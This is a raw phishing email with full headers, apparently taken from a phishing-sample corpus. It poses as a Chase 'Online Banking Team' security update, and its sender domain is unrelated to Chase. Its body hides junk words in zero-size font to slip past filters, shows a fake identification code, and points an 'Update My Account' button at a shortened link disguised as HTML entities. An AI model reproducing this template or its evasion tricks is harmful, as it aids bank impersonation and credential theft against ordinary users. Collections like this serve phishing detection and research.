@@ -1,0 +1,249 @@
+Return-Path: vendas@montroiz.com.br
+Delivered-To: jose@monkey.org
+X-FDA: 81062978052.01.B586F6F
+Received: from newmail.digitalmidiaservice.com.br (newmail.digitalmidiaservice.com.br [162.214.146.186])
+	by imf06.b.hostedemail.com (Postfix) with ESMTP id 86B15C0005
+	for <jose@monkey.org>; Sat, 29 Jul 2023 01:53:44 +0000 (UTC)
+Authentication-Results: imf06.b.hostedemail.com;
+	dkim=pass header.d=montroiz.com.br header.s=default header.b="wS/ap2b6";
+	spf=none (imf06.b.hostedemail.com: domain of vendas@montroiz.com.br has no SPF policy when checking 162.214.146.186) smtp.mailfrom=vendas@montroiz.com.br;
+	dmarc=pass (policy=quarantine) header.from=montroiz.com.br
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1690595624;
+	h=from:from:sender:reply-to:subject:subject:date:message-id:to:to:cc:
+	 mime-version:mime-version:content-type:content-type:
+	 content-transfer-encoding:in-reply-to:references:dkim-signature;
+	bh=TIewL2HhLQoPC1hSuKuPz+4YzwkNz1SJrEt59QeXH64=;
+	b=NmxwvzaZVAbdGnO3E9lNxqIjX8l6VHLwYdw3Mze0koQOvs1yVZAMNrityeKhZolLpTgp6h
+	++gOoeyWyT8yZQ5QMlApZ5zkzYRbJGSphSlDWYdVaMvo0ewcHWxru3E1BcKQTlc6bcKEQj
+	WFtAaKJhLunFkBeKueK/tI6qf71hfHw=
+ARC-Authentication-Results: i=1;
+	imf06.b.hostedemail.com;
+	dkim=pass header.d=montroiz.com.br header.s=default header.b="wS/ap2b6";
+	spf=none (imf06.b.hostedemail.com: domain of vendas@montroiz.com.br has no SPF policy when checking 162.214.146.186) smtp.mailfrom=vendas@montroiz.com.br;
+	dmarc=pass (policy=quarantine) header.from=montroiz.com.br
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1690595624; a=rsa-sha256;
+	cv=none;
+	b=qDsUcz9ZcQqnEJHHb/bH+gDDAK/TcHNPvHFL7OHXvFukt7p/9Bq/gmnmTBF5EI3QjCQK5H
+	2rVuRWgIwo26da9SOJNrspGUyOZG2csZzkca2A5xjw4EEYwg8G8jYTfF4OoZTGe43fOlkP
+	+2m5YYKKZpLVBjfyBX1654LZTLG9CL4=
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
+	d=montroiz.com.br; s=default; h=Subject:To:From:MIME-Version:Content-Type:
+	Sender:Reply-To:Date:Message-ID:Cc:Content-Transfer-Encoding:Content-ID:
+	Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
+	:Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
+	List-Subscribe:List-Post:List-Owner:List-Archive;
+	bh=TIewL2HhLQoPC1hSuKuPz+4YzwkNz1SJrEt59QeXH64=; b=wS/ap2b6hvAc2GMh3Z4AFY5HvV
+	qqEWs/IUDNqAXnYKOjX7TPBkuN661JT9des/vPpUfPkkCyQ0E/0ZixAkQr3MNu5dF8/Z2osbS5YaD
+	PsiDoORYGOfBtfnAreO/jHu7DpcOCj0xOtOP1NAyX9Qz6iVYwSL3E+X8BIR48ZBaclGNGSE088/Fw
+	IpFROBe1dtHYfirD5V9KezJkEzQHHpmPz6ELLsTmYcVz9NWZhzldLEZN6v2N7w/jemSIbJ5U5oS49
+	RMfbVvB8uOJz+Ycs3lgRJo86l2s9euCVsK68y6KyCLagQAJPfeTRrEvH3TyDzT+Q/jQKpIFgnc377
+	Msuw1usw==;
+Received: from [154.6.81.143] (port=55498 helo=[10.13.18.209])
+	by vps-5279650.digitalmidiaservice.com.br with esmtpsa  (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
+	(Exim 4.96)
+	(envelope-from <vendas@montroiz.com.br>)
+	id 1qPZ9K-0007NI-0y
+	for jose@monkey.org;
+	Fri, 28 Jul 2023 22:53:42 -0300
+Content-Type: multipart/alternative; boundary="----=_Boundary_33961_105562080.4859409665098"
+MIME-Version: 1.0
+From: "=?utf-8?q?eChase_Center=C2=AE?=" <vendas@montroiz.com.br>
+To: jose <jose@monkey.org>
+Subject: Account Security Update 28 July, 2023
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - vps-5279650.digitalmidiaservice.com.br
+X-AntiAbuse: Original Domain - monkey.org
+X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
+X-AntiAbuse: Sender Address Domain - montroiz.com.br
+X-Get-Message-Sender-Via: vps-5279650.digitalmidiaservice.com.br: authenticated_id: vendas@montroiz.com.br
+X-Authenticated-Sender: vps-5279650.digitalmidiaservice.com.br: vendas@montroiz.com.br
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+X-Rspamd-Queue-Id: 86B15C0005
+X-Stat-Signature: ky4zoepwcdhtz5t715ttgpdgysnz4pko
+X-Rspam-User: 
+X-Spam-Status: Yes, score=9.40
+X-Rspamd-Server: rspam05
+X-HE-Tag: 1690595624-508084
+X-HE-Meta: U2FsdGVkX199ljxpeFBiGNMXjovN1hX0FuDDz3NMziu4YU/tTiLQUcRZ3MZ608P8ADl7e3v+MdwFati7Qvn+rtwlGo0Y67hVoj8hpZC8yKvuWuZPBjgrusW1c5pfPqO+gGYWLP0IRx7DlboIgG9NMQSqKZSM++ojjQCqlc7t8Z/3PE69sxdodsClO3H+Tp2IAMVQhyJ4VWLMDk3EQziZfDLZa/o+nLDbfqNZDBXjxnZiozed3g+7JcDUnlj1RFJJFfRVT60TrQ9CTfbSfiqsUiSD3n5X6zRJD/EegoZtCPvNzNBNf3dw8dZVWM6a3E9+oLnuPV5tlkGzBex7v+42JOAjUomatVVc6poww98PNYsWX/FWjj7gXGs2JnVCBuixKwFviXnwbgWa7aEmFKupc6KFaVH6UtRsIlVNaqMUo+97qxHj92r8Fad7gSRaKlrx2Ww+0dineZo70WSHmKu3DSnAo7VGjXtwGSDOKIz+S+rmBdxrrfGIfh1x9z8rsPwk5RFJvI14lPCALKZzWmVrE8yVHy0nfqsOHgkMJRbqKoZBJFtB3jsMT2Ce5td6pdBSUfUGUYc5UiyikfMcTQ7p3AyTpu2eMh+w5KmYUhU4VEvyjMVvpcDlqZcIo0uB91ReS5E0LKKzjejGCUORlEzsa7KkKp5TwiUt8131bpK3fZeXcMfc/EFoCdxLQU2H6Bnodm7aWu1v4riafosICbMe3omJZlrKA1Pn
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 221
+
+------=_Boundary_33961_105562080.4859409665098
+Content-Type: text/plain; charset="utf-8"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+
+=C2=A0 Dear Customer =C2=A0 Hfigureere istoperationhe Identtryificatpersoni=
+onCodbelieveeylevelouwikeyllnremaineedhardtoccertainompleteyououtsideronlpo=
+werineenrolpositivelmentowrongrrechildsetyfocusourpdemocraticassword.Ytrial=
+ourIdentifeveryicationCoskinde is: 50577286This code will expire in 24 hour=
+s so please enter it in the appropriate field online as soon as possible. =
+=C2=A0 If you did not authorize this request, Please update your account by=
+ clicking on the button below. Update My AccountThank you for being a value=
+d customer.Sinerely, Online Banking Team
+------=_Boundary_33961_105562080.4859409665098
+Content-Type: text/html; charset="utf-8"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+
+ <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional //EN" "http://ww=
+w.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> <html xmlns=3D"http://www.=
+w3.org/1999/xhtml" xmlns:v=3D"urn:schemas-microsoft-com:vml" xmlns:o=3D"urn=
+:schemas-microsoft-com:office:office">  <head> 	<!--[if gte mso 9]><xml><o:=
+OfficeDocumentSettings><o:AllowPNG/><o:PixelsPerInch>96</o:PixelsPerInch></=
+o:OfficeDocumentSettings></xml><![endif]--> 	<meta http-equiv=3D"Content-Ty=
+pe" content=3D"text/html; charset=3Dutf-8"> 	<meta name=3D"viewport" conten=
+t=3D"width=3Ddevice-width"> 	<!--[if !mso]><!--> 	<meta http-equiv=3D"X-UA-=
+Compatible" content=3D"IE=3Dedge"> 	<!--<![endif]--> 	<title></title> 	<!--=
+[if !mso]><!--> 	<!--<![endif]--> 	<style type=3D"text/css"> 		body { 			ma=
+rgin: 0; 			padding: 0; 		}  		table, 		td, 		tr { 			vertical-align: top; =
+			border-collapse: collapse; 		}  		* { 			line-height: inherit; 		}  		a[=
+x-apple-data-detectors=3Dtrue] { 			color: inherit !important; 			text-deco=
+ration: none !important; 		} 	</style> 	<style type=3D"text/css" id=3D"medi=
+a-query"> 		@media (max-width: 520px) {  			.block-grid, 			.col { 				min-=
+width: 320px !important; 				max-width: 100% !important; 				display: block=
+ !important; 			}  			.block-grid { 				width: 100% !important; 			}  			.c=
+ol { 				width: 100% !important; 			}  			.col_cont { 				margin: 0 auto; 	=
+		}  			img.fullwidth, 			img.fullwidthOnMobile { 				max-width: 100% !impo=
+rtant; 			}  			.no-stack .col { 				min-width: 0 !important; 				display: =
+table-cell !important; 			}  			.no-stack.two-up .col { 				width: 50% !imp=
+ortant; 			}  			.no-stack .col.num2 { 				width: 16.6% !important; 			}  	=
+		.no-stack .col.num3 { 				width: 25% !important; 			}  			.no-stack .col.=
+num4 { 				width: 33% !important; 			}  			.no-stack .col.num5 { 				width:=
+ 41.6% !important; 			}  			.no-stack .col.num6 { 				width: 50% !important=
+; 			}  			.no-stack .col.num7 { 				width: 58.3% !important; 			}  			.no-=
+stack .col.num8 { 				width: 66.6% !important; 			}  			.no-stack .col.num9=
+ { 				width: 75% !important; 			}  			.no-stack .col.num10 { 				width: 83=
+.3% !important; 			}  			.video-block { 				max-width: none !important; 			=
+}  			.mobile_hide { 				min-height: 0px; 				max-height: 0px; 				max-widt=
+h: 0px; 				display: none; 				overflow: hidden; 				font-size: 0px; 			}  =
+			.desktop_hide { 				display: block !important; 				max-height: none !imp=
+ortant; 			} 		} 	</style> </head>  <body class=3D"clean-body" style=3D"mar=
+gin: 0; padding: 0; -webkit-text-size-adjust: 100%; background-color: #FFFF=
+FF;"> 	<!--[if IE]><div class=3D"ie-browser"><![endif]--> 	<table class=3D"=
+nl-container" style=3D"table-layout: fixed; vertical-align: top; min-width:=
+ 320px; border-spacing: 0; border-collapse: collapse; mso-table-lspace: 0pt=
+; mso-table-rspace: 0pt; background-color: #FFFFFF; width: 100%;" cellpaddi=
+ng=3D"0" cellspacing=3D"0" role=3D"presentation" width=3D"100%" bgcolor=3D"=
+#FFFFFF" valign=3D"top"> 		<tbody> 			<tr style=3D"vertical-align: top;" va=
+lign=3D"top"> 				<td style=3D"word-break: break-word; vertical-align: top;=
+" valign=3D"top"> 					<!--[if (mso)|(IE)]><table width=3D"100%" cellpaddin=
+g=3D"0" cellspacing=3D"0" border=3D"0"><tr><td align=3D"center" style=3D"ba=
+ckground-color:#FFFFFF"><![endif]--> 					<div style=3D"background-color:tr=
+ansparent;"> 						<div class=3D"block-grid " style=3D"min-width: 320px; ma=
+x-width: 500px; overflow-wrap: break-word; word-wrap: break-word; word-brea=
+k: break-word; Margin: 0 auto; background-color: transparent;"> 							<div=
+ style=3D"border-collapse: collapse;display: table;width: 100%;background-c=
+olor:transparent;"> 								<!--[if (mso)|(IE)]><table width=3D"100%" cellp=
+adding=3D"0" cellspacing=3D"0" border=3D"0" style=3D"background-color:trans=
+parent;"><tr><td align=3D"center"><table cellpadding=3D"0" cellspacing=3D"0=
+" border=3D"0" style=3D"width:500px"><tr class=3D"layout-full-width" style=
+=3D"background-color:transparent"><![endif]--> 								<!--[if (mso)|(IE)]>=
+<td align=3D"center" width=3D"500" style=3D"background-color:transparent;wi=
+dth:500px; border-top: 0px solid transparent; border-left: 0px solid transp=
+arent; border-bottom: 0px solid transparent; border-right: 0px solid transp=
+arent;" valign=3D"top"><table width=3D"100%" cellpadding=3D"0" cellspacing=
+=3D"0" border=3D"0"><tr><td style=3D"padding-right: 0px; padding-left: 0px;=
+ padding-top:5px; padding-bottom:5px;"><![endif]--> 								<div class=3D"c=
+ol num12" style=3D"min-width: 320px; max-width: 500px; display: table-cell;=
+ vertical-align: top; width: 500px;"> 									<div class=3D"col_cont" styl=
+e=3D"width:100% !important;"> 										<!--[if (!mso)&(!IE)]><!--> 							=
+			<div style=3D"border-top:0px solid transparent; border-left:0px solid tr=
+ansparent; border-bottom:0px solid transparent; border-right:0px solid tran=
+sparent; padding-top:5px; padding-bottom:5px; padding-right: 0px; padding-l=
+eft: 0px;"> 											<!--<![endif]--> 											<div class=3D"img-contai=
+ner center fixedwidth" align=3D"center" style=3D"padding-right: 0px;padding=
+-left: 0px;"> 												<!--[if mso]><table width=3D"100%" cellpadding=3D=
+"0" cellspacing=3D"0" border=3D"0"><tr style=3D"line-height:0px"><td style=
+=3D"padding-right: 0px;padding-left: 0px;" align=3D"center"><![endif]--><im=
+g class=3D"center fixedwidth" align=3D"center" border=3D"0" src=3D"https://=
+www.chase.com/content/dam/chaseonline/en/alerts/ondemand/eventdriven/mol/im=
+ages/chaseNew.gif" style=3D"text-decoration: none; -ms-interpolation-mode: =
+bicubic; height: auto; border: 0; width: 100%; max-width: 225px; display: b=
+lock;" width=3D"225"> 												<!--[if mso]></td></tr></table><![endif]-=
+-> 											</div> 											<!--[if mso]><table width=3D"100%" cellpadd=
+ing=3D"0" cellspacing=3D"0" border=3D"0"><tr><td style=3D"padding-right: 10=
+px; padding-left: 10px; padding-top: 10px; padding-bottom: 10px; font-famil=
+y: Arial, sans-serif"><![endif]--> 											<div style=3D"color:#393d47;f=
+ont-family:Arial, Helvetica Neue, Helvetica, sans-serif;line-height:1.2;pad=
+ding-top:10px;padding-right:10px;padding-bottom:10px;padding-left:10px;"> 	=
+											<div class=3D"whateverfff" style=3D"line-height: 1.2; font-size:=
+ 12px; color: #393d47; font-family: Arial, Helvetica Neue, Helvetica, sans-=
+serif; mso-line-height-alt: 14px;"> 													<p style=3D"font-size: 14p=
+x; line-height: 1.2; word-break: break-word; mso-line-height-alt: 17px; mar=
+gin: 0;">&nbsp;</p> 													<p style=3D"line-height: 1.2; word-break: =
+break-word; mso-line-height-alt: 14px; margin: 0;">Dear Customer</p> 						=
+							<p style=3D"line-height: 1.2; word-break: break-word; mso-line-heigh=
+t-alt: 14px; margin: 0;">&nbsp;</p> 													<p style=3D"line-height: 1=
+.2; word-break: break-word; mso-line-height-alt: 14px; margin:  0;">H<stron=
+g style=3D'font-size: 0px;'>figure</strong>ere is  t<strong style=3D'font-s=
+ize: 0px;'>operation</strong>he   Ident<strong style=3D'font-size: 0px;'>tr=
+y</strong>ificat<strong style=3D'font-size: 0px;'>person</strong>ion  Cod<s=
+trong style=3D'font-size: 0px;'>believe</strong>e  y<strong style=3D'font-s=
+ize: 0px;'>level</strong>ou  wi<strong style=3D'font-size: 0px;'>key</stron=
+g>ll  n<strong style=3D'font-size: 0px;'>remain</strong>eed  <strong style=
+=3D'font-size: 0px;'>hard</strong>to  c<strong style=3D'font-size: 0px;'>ce=
+rtain</strong>omplete  you<strong style=3D'font-size: 0px;'>outside</strong=
+>r  onl<strong style=3D'font-size: 0px;'>power</strong>ine  enrol<strong st=
+yle=3D'font-size: 0px;'>positive</strong>lment  o<strong style=3D'font-size=
+: 0px;'>wrong</strong>r  re<strong style=3D'font-size: 0px;'>child</strong>=
+set  y<strong style=3D'font-size: 0px;'>focus</strong>our  p<strong style=
+=3D'font-size: 0px;'>democratic</strong>assword.  Y<strong style=3D'font-si=
+ze: 0px;'>trial</strong>our  Identif<strong style=3D'font-size: 0px;'>every=
+</strong>ication  Co<strong style=3D'font-size: 0px;'>skin</strong>de is: 5=
+0577286<br>This code will expire in 24 hours so please enter it in the appr=
+opriate field online as soon as possible.<br><br></p> 													<p style=
+=3D"line-height: 1.2; word-break: break-word; mso-line-height-alt: 14px; ma=
+rgin: 0;">&nbsp;</p> 													<p style=3D"line-height: 1.2; word-break:=
+ break-word; mso-line-height-alt: 14px; margin: 0;">If you did not authoriz=
+e this request, Please update your account by clicking on the button below.=
+</p> 												</div> 											</div> 											<!--[if mso]></td></tr=
+></table><![endif]--> 											<div class=3D"button-container" align=3D"c=
+enter" style=3D"padding-top:10px;padding-right:10px;padding-bottom:10px;pad=
+ding-left:10px;"> 												<!--[if mso]><table width=3D"100%" cellpaddin=
+g=3D"0" cellspacing=3D"0" border=3D"0" style=3D"border-spacing: 0; border-c=
+ollapse: collapse; mso-table-lspace:0pt; mso-table-rspace:0pt;"><tr><td sty=
+le=3D"padding-top: 10px; padding-right: 10px; padding-bottom: 10px; padding=
+-left: 10px" align=3D"center"><v:roundrect xmlns:v=3D"urn:schemas-microsoft=
+-com:vml" xmlns:w=3D"urn:schemas-microsoft-com:office:word" href=3D"https:/=
+/&#x62;&#x69;&#x74;&#x2e;&#x6c;&#x79;&#x2f;&#x33;&#x71;&#x30;&#x44;&#x55;&#=
+x55;&#x38;" style=3D"height:32.25pt;width:172.5pt;v-text-anchor:middle;" ar=
+csize=3D"10%" strokeweight=3D"0.75pt" strokecolor=3D"#8a3b8f" fillcolor=3D"=
+#025e98"><w:anchorlock/><v:textbox inset=3D"0,0,0,0"><center style=3D"color=
+:#ffffff; font-family:Arial, sans-serif; font-size:16px"><![endif]--><a hre=
+f=3D"https://&#x62;&#x69;&#x74;&#x2e;&#x6c;&#x79;&#x2f;&#x33;&#x71;&#x30;&#=
+x44;&#x55;&#x55;&#x38;" target=3D"_blank" style=3D"-webkit-text-size-adjust=
+: none; text-decoration: none; display: inline-block; color: #ffffff; backg=
+round-color: #025e98; border-radius: 4px; -webkit-border-radius: 4px; -moz-=
+border-radius: 4px; width: auto; width: auto; border-top: 1px solid #8a3b8f=
+; border-right: 1px solid #8a3b8f; border-bottom: 1px solid #8a3b8f; border=
+-left: 1px solid #8a3b8f; padding-top: 5px; padding-bottom: 5px; font-famil=
+y: Arial, Helvetica Neue, Helvetica, sans-serif; text-align: center; mso-bo=
+rder-alt: none; word-break: keep-all;"><span style=3D"padding-left:20px;pad=
+ding-right:20px;font-size:16px;display:inline-block;letter-spacing:undefine=
+d;"><span style=3D"font-size: 16px; line-height: 2; word-break: break-word;=
+ mso-line-height-alt: 32px;">Update My Account</span></span></a> 										=
+		<!--[if mso]></center></v:textbox></v:roundrect></td></tr></table><![endi=
+f]--> 											</div> 											<!--[if mso]><table width=3D"100%" cellp=
+adding=3D"0" cellspacing=3D"0" border=3D"0"><tr><td style=3D"padding-right:=
+ 10px; padding-left: 10px; padding-top: 10px; padding-bottom: 10px; font-fa=
+mily: Arial, sans-serif"><![endif]--> 											<div style=3D"color:#393d4=
+7;font-family:Arial, Helvetica Neue, Helvetica, sans-serif;line-height:1.2;=
+padding-top:10px;padding-right:10px;padding-bottom:10px;padding-left:10px;"=
+> 												<div class=3D"whateverfff" style=3D"line-height: 1.2; font-si=
+ze: 12px; color: #393d47; font-family: Arial, Helvetica Neue, Helvetica, sa=
+ns-serif; mso-line-height-alt: 14px;"> 													<p style=3D"line-height=
+: 1.2; word-break: break-word; mso-line-height-alt: 14px; margin: 0;">Thank=
+ you for being a valued customer.<br>Sinerely,</p><br>  													<p sty=
+le=3D"font-size: 14px; line-height: 1.2; word-break: break-word; mso-line-h=
+eight-alt: 17px; margin: 0;">Online Banking Team</p> 												</div> 			=
+								</div> 										</div> 									</div> 								</div> 							</div=
+> 						</div> 					</div> 				</td> 			</tr> 		</tbody> 	</table> </body> =
+ </html>
+------=_Boundary_33961_105562080.4859409665098--
+
